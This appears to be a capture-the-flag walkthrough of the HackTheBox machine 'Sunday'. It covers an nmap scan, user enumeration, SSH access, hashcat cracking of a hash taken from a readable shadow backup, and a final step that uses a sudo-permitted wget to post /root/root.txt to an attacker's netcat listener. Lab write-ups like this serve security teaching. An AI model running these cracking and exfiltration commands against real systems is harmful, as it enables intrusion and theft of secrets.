# Recon
We start with a nmap scan but we add ```--max-retries 0``` so it will speed up the process.
```
sudo nmap -sV -sC -O -p- -oN nmap.txt 10.10.10.76 -T 5 --max-retries 0
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Sunday/assets/2.png">

# Enumeration
We can do a simple check to see which users exist:
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Sunday/assets/1.png">

# Initial Foothold
We can now login using SSH on port 22022 with password ```sunday```. We see that we can run ```sudo /root/troll```. But the binary doesn't seem to exist.

We find a shadow backup file which we can read. We extract the hash and bruteforce it with hashcat.
```
hashcat -a 0 -m 7400 hash /usr/share/wordlists/rockyou.txt -w 3 -O
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Sunday/assets/3.png">

We can now login as user sammy. Using ```sudo -l``` we find that it's possible to run ```sudo /usr/bin/wget```.

We can use it to paste the content of root.txt and collect it with netcat.
```
sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.7:4444
```


